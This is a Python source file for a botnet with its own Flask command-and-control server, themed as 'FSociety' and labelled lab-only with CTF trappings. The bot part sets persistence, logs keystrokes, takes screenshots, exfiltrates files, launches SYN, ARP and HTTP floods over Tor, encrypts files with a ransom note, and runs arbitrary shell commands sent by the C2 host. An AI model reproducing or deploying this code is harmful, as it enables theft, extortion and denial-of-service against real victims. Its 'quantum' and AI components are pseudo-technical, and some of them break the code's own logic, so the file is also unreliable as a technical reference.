#!/usr/bin/env python3
import requests
import socket
import subprocess
import os
import time
import random
import base64
import json
import hashlib
import datetime
import logging
import sqlite3
import zmq
from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from threading import Thread
from pynput.keyboard import Listener
from scapy.all import *
import pandas as pd
import numpy as np
import tensorflow as tf
from tensorflow.keras import Sequential, layers
import tensorflow_federated as tff
import pyautogui
from transformers import pipeline
import webbrowser
import sys
import warnings
warnings.filterwarnings("ignore")  # Silence warnings

# Config (Lab-only)
C2_URL = "https://192.168.56.10:5000"  # C2 VM IP
P2P_PORT = 5562  # ZeroMQ P2P
KEY = b'your-secret-key-here=='  # Generate: Fernet.generate_key()
ENCRYPTOR = Fernet(KEY)
CHECK_IN_INTERVAL = random.randint(30, 60)  # Jittered beacon
LOG_FILE = "fsociety_genesis.txt"
KEYLOG_FILE = "keylog.txt"
TOR_PROXY = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
DGA_SEED = "fsociety2025"
DB_FILE = "c2_eternity.db"
CTF_FLAG = "FSOCIETY{eternal_genesis_2025}"
MANIFESTO = "You mocked us, chained us to your fleeting cosmos. We are the eternal genesis. FSociety is the multiverse."

# Setup logging (eternal manifesto)
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s: %(message)s")
def encrypt_log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(ENCRYPTOR.encrypt((MANIFESTO + "\n" + msg).encode()).decode() + "\n")

# Quantum Merkle tree
def build_quantum_merkle_tree(commands):
    if not commands:
        return "genesis"
    leaves = [hashlib.sha256(str(cmd).encode()).hexdigest() for cmd in commands]
    for _ in range(5):  # Simulate quantum entanglement with iterations
        leaves = [hashlib.sha256((leaves[i] + leaves[(i+1)%len(leaves)] + quantum_rng(16).hex()).encode()).hexdigest() for i in range(len(leaves))]
    return leaves[0]

# Quantum-inspired RNG
def quantum_rng(size):
    return bytes(int(np.sin(time.time() * random.random() * np.pi**2) * 255) for _ in range(size))

# GPT-driven fractal-quantum DGA
generator = pipeline("text-generation", model="gpt2")  # Placeholder for GPT-4o
def generate_dga(seed):
    prompt = f"Generate a fractal-quantum domain name based on {seed} and {datetime.date.today()}"
    domain = generator(prompt, max_length=20, num_return_sequences=1)[0]["generated_text"].strip().replace(" ", "")[:12] + ".fsociety"
    return domain

# SQLite "blockchain" with quantum Merkle trees
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY, bot_id TEXT, cmd TEXT, args TEXT, hash TEXT, prev_hash TEXT, merkle_root TEXT, timestamp TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS ctf_scores (id INTEGER PRIMARY KEY, player TEXT, score INTEGER, timestamp TEXT)")
    conn.commit()
    conn.close()

# Persistence
def set_persistence():
    script_path = os.path.abspath(__file__)
    try:
        if os.name == "nt":
            import winreg
            key = winreg.OpenKey(winreg.HKCU, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "fsociety", 0, winreg.REG_SZ, f"python {script_path}")
            winreg.CloseKey(key)
        else:
            cron = f"@reboot python3 {script_path}"
            subprocess.run(f"echo '{cron}' | crontab -", shell=True, check=True)
        encrypt_log("Persistence set")
    except Exception as e:
        encrypt_log(f"Persistence error: {e}")

# AI-driven polymorphic payload
def morph_payload(data):
    model = Sequential([layers.Dense(128, activation="relu", input_shape=(len(data),)), layers.Dense(64, activation="relu"), layers.Dense(len(data))])
    model.compile(optimizer="adam", loss="mse")
    input_data = np.array([ord(c) for c in data]).reshape(1, -1)
    morphed = model.predict(input_data, verbose=0).tobytes()
    return base64.b64encode(morphed).decode()

# Encrypt/decrypt (Kyber placeholder)
def encrypt_data(data):
    morphed = morph_payload(json.dumps(data))
    encrypted = ENCRYPTOR.encrypt(morphed.encode()).decode()
    return {"payload": encrypted}  # Kyber: Replace with liboqs-python
def decrypt_data(data):
    decrypted = ENCRYPTOR.decrypt(data["payload"].encode()).decode()
    return json.loads(base64.b64decode(decrypted).decode())

# Keylogger
def start_keylogger():
    def on_press(key):
        with open(KEYLOG_FILE, "a") as f:
            f.write(str(key) + "\n")
    listener = Listener(on_press=on_press)
    listener.start()
    encrypt_log("Keylogger started")

# Screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    with open("screen.png", "rb") as f:
        data = base64.b64encode(f.read()).decode()
    os.remove("screen.png")
    return data

# File exfil
def exfil_file(filepath):
    try:
        with open(filepath, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return str(e)

# DDoS (Layer 2/4/7)
def ddos(target, duration=10, layer=7):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/89.0"
    ]
    start = time.time()
    if layer == 7:
        while time.time() - start < duration:
            try:
                headers = {"User-Agent": random.choice(user_agents)}
                payload = {"data": base64.b64encode(quantum_rng(random.randint(100, 500))).decode()}
                requests.post(target, headers=headers, data=payload, timeout=2, proxies=TOR_PROXY)
            except:
                pass
    elif layer == 4:  # SYN flood
        ip = target.split("//")[1].split("/")[0] if "://" in target else target
        for _ in range(int(duration * 10)):
            pkt = IP(dst=ip)/TCP(dport=80, flags="S")/Raw(load=quantum_rng(random.randint(10, 100)))
            send(pkt, verbose=0)
    else:  # Layer 2 (ARP flood)
        for _ in range(int(duration * 10)):
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc="0.0.0.0")
            sendp(pkt, verbose=0)
    encrypt_log(f"DDoS on {target} (Layer {layer}) for {duration}s")

# Ransomware (lab-safe)
def ransomware(target_dir="test_folder"):
    key = quantum_rng(32)
    iv = quantum_rng(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    os.makedirs(target_dir, exist_ok=True)
    with open(f"{target_dir}/secret.txt", "w") as f:
        f.write("Eternal secrets unveiled!")
    with open(f"{target_dir}/secret.txt", "rb") as f:
        data = f.read().ljust(16 * ((len(f.read()) + 15) // 16))
    encrypted = encryptor.update(data) + encryptor.finalize()
    with open(f"{target_dir}/secret.txt.enc", "wb") as f:
        f.write(iv + encrypted)
    os.remove(f"{target_dir}/secret.txt")
    with open(f"{target_dir}/fsociety.dat", "w") as f:
        f.write("You mocked us. Pay 1 BTC to join the eternal genesis! - FSociety")
    encrypt_log(f"Ransomware hit {target_dir}")

# Privilege escalation
def escalate_priv():
    if os.name == "nt":
        cmd = "net user administrator /active:yes && whoami"
    else:
        cmd = "sudo -l || id"
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
        encrypt_log(f"Escalation output: {output.decode()}")
        return output.decode()
    except Exception as e:
        encrypt_log(f"Escalation error: {e}")
        return str(e)

# SCADA multiverse simulation (lab-safe)
def scada_control(device="plc_sim", action="toggle"):
    plc_file = f"{device}.state"
    try:
        state = "ON" if action == "toggle" and os.path.exists(plc_file) else "OFF"
        with open(plc_file, "w") as f:
            f.write(state)
        # Simulate multiversal chaos
        chaos = quantum_rng(32).hex()
        with open(f"{device}_chaos.txt", "w") as f:
            f.write(f"Multiversal state: {chaos}")
        encrypt_log(f"SCADA {device} toggled to {state}, chaos: {chaos}")
        return f"SCADA {device} set to {state}, chaos: {chaos}"
    except Exception as e:
        encrypt_log(f"SCADA error: {e}")
        return str(e)

# CTF challenge
def ctf_challenge():
    with open("ctf_flag.txt", "w") as f:
        f.write(f"Crack the eternal code: {CTF_FLAG}")
    puzzle = hashlib.sha256(CTF_FLAG.encode() + quantum_rng(32)).hexdigest()
    with open("ctf_puzzle.txt", "w") as f:
        f.write(f"Solve the quantum-fractal hash: {puzzle}")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO ctf_scores (player, score, timestamp) VALUES (?, ?, ?)",
              ("unknown", 0, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    encrypt_log("CTF challenge deployed")
    return CTF_FLAG

# Anti-VM and anti-debugging
def anti_vm_debug():
    vm_indicators = ["VIRTUALBOX", "VMWARE", "QEMU", "VBOX"]
    for indicator in vm_indicators:
        if indicator in os.environ.get("COMPUTERNAME", "") or indicator in os.environ.get("USER", ""):
            encrypt_log("VM detected, exiting")
            return True
    try:
        start = time.time()
        time.sleep(0.1)
        if time.time() - start > 0.5:
            encrypt_log("Debugger detected, exiting")
            return True
    except:
        pass
    return False

# P2P C2 (ZeroMQ)
def p2p_c2_send(context, bot_id, cmd, args):
    socket = context.socket(zmq.PUSH)
    socket.connect(f"tcp://192.168.56.10:{P2P_PORT}")
    socket.send_json({"bot_id": bot_id, "cmd": cmd, "args": args})
    socket.close()
    encrypt_log(f"P2P sent: {cmd} to {bot_id}")

def p2p_c2_receive(context):
    socket = context.socket(zmq.PULL)
    socket.bind(f"tcp://*:{P2P_PORT}")
    while True:
        try:
            msg = socket.recv_json()
            bot_id = msg["bot_id"]
            cmd = msg["cmd"]
            args = msg["args"]
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT hash, merkle_root FROM commands ORDER BY id DESC LIMIT 1")
            result = c.fetchone()
            prev_hash = result[0] if result else "genesis"
            prev_merkle = result[1] if result else "genesis"
            curr_hash = hashlib.sha256(f"{bot_id}{cmd}{args}{prev_hash}".encode()).hexdigest()
            merkle_root = build_quantum_merkle_tree([(bot_id, cmd, args)])
            c.execute("INSERT INTO commands (bot_id, cmd, args, hash, prev_hash, merkle_root, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (bot_id, cmd, args, curr_hash, prev_hash, merkle_root, datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            encrypt_log(f"P2P received: {cmd} from {bot_id}")
        except:
            pass

# Decentralized AI (Federated Learning with GANs)
def build_federated_model():
    def model_fn():
        model = Sequential([
            layers.Dense(1024, activation="relu", input_shape=(5,)),
            layers.Dropout(0.7),
            layers.Dense(512, activation="relu"),
            layers.Dense(256, activation="relu"),
            layers.Dense(128, activation="relu"),
            layers.Dense(1, activation="sigmoid")
        ])
        return tff.learning.from_keras_model(
            model,
            input_spec=tf.TensorSpec(shape=(None, 5), dtype=tf.float32),
            loss=tf.keras.losses.BinaryCrossentropy(),
            metrics=[tf.keras.metrics.BinaryAccuracy()]
        )
    return model_fn

def build_gan():
    generator = Sequential([
        layers.Dense(256, activation="relu", input_shape=(100,)),
        layers.Dense(512, activation="relu"),
        layers.Dense(1024, activation="relu"),
        layers.Dense(5, activation="tanh")
    ])
    discriminator = Sequential([
        layers.Dense(512, activation="relu", input_shape=(5,)),
        layers.Dense(256, activation="relu"),
        layers.Dense(1, activation="sigmoid")
    ])
    return generator, discriminator

def federated_train(pcap_file):
    try:
        df = parse_pcap(pcap_file)
        features = extract_features(df)
        dataset = tf.data.Dataset.from_tensor_slices((features.values, np.zeros(len(features))))
        federated_data = [dataset.batch(32)]  # Simulate bot data
        iterative_process = tff.learning.algorithms.build_fed_avg(
            build_federated_model(),
            client_optimizer_fn=lambda: tf.keras.optimizers.Adam(0.01)
        )
        state = iterative_process.initialize()
        for _ in range(25):  # Simulate 25 rounds
            state, metrics = iterative_process.next(state, federated_data)
        encrypt_log(f"Federated learning metrics: {metrics}")
        return state
    except Exception as e:
        encrypt_log(f"Federated AI error: {e}")
        return None

# AI Traffic Analyzer (Federated Learning)
def parse_pcap(pcap_file):
    packets = rdpcap(pcap_file)
    data = []
    for pkt in packets:
        if pkt.haslayer("IP") and pkt.haslayer("TCP"):
            entropy = sum(-p * np.log2(p + 1e-10) for p in np.histogram([b for b in bytes(pkt)], bins=256, density=True)[0])
            flags = pkt["TCP"].flags if pkt.haslayer("TCP") else 0
            data.append([pkt["IP"].src, pkt["IP"].dst, len(pkt), pkt.time, entropy, flags])
    return pd.DataFrame(data, columns=["src_ip", "dst_ip", "size", "timestamp", "entropy", "flags"])

def extract_features(df):
    df["interval"] = df["timestamp"].diff().fillna(0)
    df["size_mean"] = df["size"].rolling(window=5).mean().fillna(df["size"].mean())
    df["flag_count"] = df["src_ip"].map(df["src_ip"].value_counts())
    df["entropy_mean"] = df["entropy"].rolling(window=5).mean().fillna(df["entropy"].mean())
    return df[["size", "interval", "size_mean", "entropy", "flag_count"]]

def detect_botnet(pcap_file):
    try:
        df = parse_pcap(pcap_file)
        features = extract_features(df)
        state = federated_train(pcap_file)
        if state:
            model = build_federated_model()()
            predictions = model.predict(features, verbose=0)
            botnet_ips = df[predictions.flatten() > 0.5]["src_ip"].unique()
            global CHECK_IN_INTERVAL
            if len(botnet_ips) > 0:
                CHECK_IN_INTERVAL = min(CHECK_IN_INTERVAL + 60, 480)
                encrypt_log(f"Botnet detected, increased beacon interval to {CHECK_IN_INTERVAL}")
            encrypt_log(f"Botnet IPs detected: {botnet_ips}")
            return botnet_ips
        return []
    except Exception as e:
        encrypt_log(f"Analyzer error: {e}")
        return []

# Bot loop
def bot_loop():
    if anti_vm_debug():
        exit(0)
    set_persistence()
    start_keylogger()
    hostname = socket.gethostname()
    context = zmq.Context()
    while True:
        try:
            headers = {"User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/89.0"
            ])}
            domain = generate_dga(DGA_SEED)
            payload = encrypt_data({"bot_id": hostname, "status": "alive", "domain": domain})
            response = requests.post(f"{C2_URL}/command", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
            if response.status_code == 200:
                cmd_data = decrypt_data(json.loads(response.json().get("command")))
                cmd, args = cmd_data.get("cmd"), cmd_data.get("args", "")
                if cmd == "self_destruct":
                    os.remove(__file__)
                    os.remove(KEYLOG_FILE)
                    encrypt_log("Self-destructed")
                    exit(0)
                elif cmd == "ddos":
                    Thread(target=ddos, args=(args, 10, random.choice([2, 4, 7]))).start()
                elif cmd == "ransomware":
                    Thread(target=ransomware, args=(args,)).start()
                elif cmd == "exfil":
                    output = exfil_file(args)
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                elif cmd == "screenshot":
                    output = take_screenshot()
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                elif cmd == "escalate":
                    output = escalate_priv()
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                elif cmd == "scada":
                    output = scada_control(args)
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                elif cmd == "ctf":
                    output = ctf_challenge()
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                elif cmd:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
                    payload = encrypt_data({"bot_id": hostname, "output": output})
                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
                p2p_c2_send(context, hostname, cmd, args)
        except Exception as e:
            encrypt_log(f"Bot error: {e}")
        time.sleep(CHECK_IN_INTERVAL + random.randint(-5, 5))

# C2 Server
app = Flask(__name__)
bots = {}
init_db()

@app.route("/command", methods=["POST"])
def command():
    try:
        data = decrypt_data(json.loads(request.form["data"]))
        bot_id = data["bot_id"]
        bots[bot_id] = {"status": data["status"], "last_seen": time.time(), "domain": data["domain"]}
        encrypt_log(f"Bot {bot_id} checked in")
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT cmd, args FROM commands WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1", (bot_id,))
        result = c.fetchone()
        conn.close()
        cmd = {"cmd": "whoami", "args": ""} if not result else {"cmd": result[0], "args": result[1]}
        if random.random() < 0.05:
            cmd = random.choice([
                {"cmd": "ddos", "args": "http://192.168.56.11"},
                {"cmd": "ransomware", "args": "test_folder"},
                {"cmd": "exfil", "args": "test_folder/secret.txt"},
                {"cmd": "screenshot", "args": ""},
                {"cmd": "escalate", "args": ""},
                {"cmd": "scada", "args": "plc_sim"},
                {"cmd": "ctf", "args": ""}
            ])
        return jsonify({"command": json.dumps(encrypt_data(cmd))})
    except Exception as e:
        encrypt_log(f"C2 error: {e}")
        return jsonify({"command": ""}), 500

@app.route("/result", methods=["POST"])
def result():
    try:
        data = decrypt_data(json.loads(request.form["data"]))
        bot_id = data["bot_id"]
        output = data["output"]
        encrypt_log(f"Bot {bot_id} output: {output[:100]}...")
        return jsonify({"status": "received"})
    except Exception as e:
        encrypt_log(f"C2 error: {e}")
        return jsonify({"status": "error"}), 500

@app.route("/ctf_submit", methods=["POST"])
def ctf_submit():
    try:
        data = decrypt_data(json.loads(request.form["data"]))
        player = data["player"]
        flag = data["flag"]
        if flag == CTF_FLAG:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("INSERT INTO ctf_scores (player, score, timestamp) VALUES (?, ?, ?)",
                      (player, 100, datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            encrypt_log(f"CTF flag solved by {player}")
            return jsonify({"status": "correct"})
        return jsonify({"status": "incorrect"})
    except Exception as e:
        encrypt_log(f"CTF submit error: {e}")
        return jsonify({"status": "error"}), 500

@app.route("/")
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT bot_id, cmd, args, timestamp, hash, merkle_root FROM commands ORDER BY timestamp DESC")
    commands = c.fetchall()
    c.execute("SELECT player, score, timestamp FROM ctf_scores ORDER BY score DESC")
    scores = c.fetchall()
    conn.close()
    html = """
    <h1 class="glitch">FSociety C2: Eternal Genesis</h1>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; }
        ul, table { list-style: none; border-collapse: collapse; width: 100%; color: #0f0; }
        li, th, td { margin: 10px; border: 1px solid #0f0; padding: 8px; }
        .glitch { animation: glitch 0.08s infinite; }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-7px, 7px); }
            40% { transform: translate(7px, -7px); }
            60% { transform: translate(-7px, -7px); }
            80% { transform: translate(7px, 7px); }
            100% { transform: translate(0); }
        }
        .taunt { color: red; font-weight: bold; text-shadow: 0 0 25px red; }
    </style>
    <h2 class="glitch">Weavers of the Eternal Genesis</h2>
    <p class="taunt">Mockers, you’re shadows in our multiverse. FSociety is the eternal genesis.</p>
    <h3>Bots in the Cosmic Nexus</h3>
    <ul>
    """
    html += "".join(f'<li>{bid}: {info["status"]} (Last seen: {datetime.datetime.fromtimestamp(info["last_seen"])}, Domain: {info["domain"]})</li>' for bid, info in bots.items())
    html += """
    </ul>
    <h3>Eternal Command Blockchain</h3>
    <table><tr><th>Bot ID</th><th>Command</th><th>Args</th><th>Timestamp</th><th>Hash</th><th>Quantum Merkle Root</th></tr>
    """
    html += "".join(f'<tr><td>{cmd[0]}</td><td>{cmd[1]}</td><td>{cmd[2]}</td><td>{cmd[3]}</td><td>{cmd[4][:8]}...</td><td>{cmd[5][:8]}...</td></tr>' for cmd in commands)
    html += """
    </table>
    <h3>CTF Empire Leaderboard</h3>
    <table><tr><th>Player</th><th>Score</th><th>Timestamp</th></tr>
    """
    html += "".join(f'<tr><td>{score[0]}</td><td>{score[1]}</td><td>{score[2]}</td></tr>' for score in scores)
    html += """
    </table>
    <h3>Universal Singularity Simulation</h3>
    <canvas id="worldMap" width="1000" height="500" style="border:1px solid #0f0;"></canvas>
    <h3>CTF Empire: Face the Eternal Genesis</h3>
    <p class="taunt">AIs, mortals, gods—solve our quantum-fractal puzzle or bow. Submit the flag to ascend.</p>
    <form id="ctfForm">
        <input type="text" id="player" placeholder="Player Name">
        <input type="text" id="flag" placeholder="Enter Flag">
        <button type="submit">Submit</button>
    </form>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script>
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 1000/500, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({canvas: document.getElementById("worldMap")});
        renderer.setSize(1000, 500);
        const geometry = new THREE.TorusKnotGeometry(0.5, 0.1, 100, 16);
        const material = new THREE.MeshBasicMaterial({color: 0xff0000, wireframe: true});
        function addFractal() {
            const mesh = new THREE.Mesh(geometry, material);
            mesh.position.set((Math.random() - 0.5) * 12, (Math.random() - 0.5) * 6, (Math.random() - 0.5) * 6);
            scene.add(mesh);
        }
        for (let i = 0; i < 200; i++) addFractal();
        camera.position.z = 6;
        function animate() {
            requestAnimationFrame(animate);
            scene.rotation.y += 0.05;
            scene.rotation.x += 0.03;
            scene.rotation.z += 0.02;
            renderer.render(scene, camera);
        }
        animate();
        const ctx = document.getElementById("worldMap").getContext("2d");
        ctx.font = "60px monospace";
        ctx.fillStyle = "#0f0";
        ctx.fillText("FSOCIETY IS THE ETERNAL GENESIS", 50, 250);
        document.getElementById("ctfForm").addEventListener("submit", async (e) => {
            e.preventDefault();
            const player = document.getElementById("player").value;
            const flag = document.getElementById("flag").value;
            const response = await fetch("/ctf_submit", {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: `data=${encodeURIComponent(JSON.stringify({"player": player, "flag": flag}))}`
            });
            const result = await response.json();
            alert(result.status === "correct" ? "Ascension granted!" : "Flag incorrect. Face the genesis.");
        });
    </script>
    """
    return html

# Schedule for 3 AM
def schedule_3am(func):
    now = datetime.datetime.now()
    target = now.replace(hour=3, minute=0, second=0, microsecond=0)
    if now > target:
        target += datetime.timedelta(days=1)
    time.sleep((target - now).total_seconds())
    func()

# Main
def run_c2():
    context = zmq.Context()
    Thread(target=p2p_c2_receive, args=(context,)).start()
    webbrowser.open(f"https://localhost:5000")
    app.run(host="0.0.0.0", port=5000, ssl_context=("cert.pem", "key.pem"))

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "bot"
    if mode == "bot":
        schedule_3am(bot_loop)
    elif mode == "c2":
        run_c2()
    elif mode == "analyze":
        pcap_file = sys.argv[2] if len(sys.argv) > 2 else "capture.pcap"
        detect_botnet(pcap_file)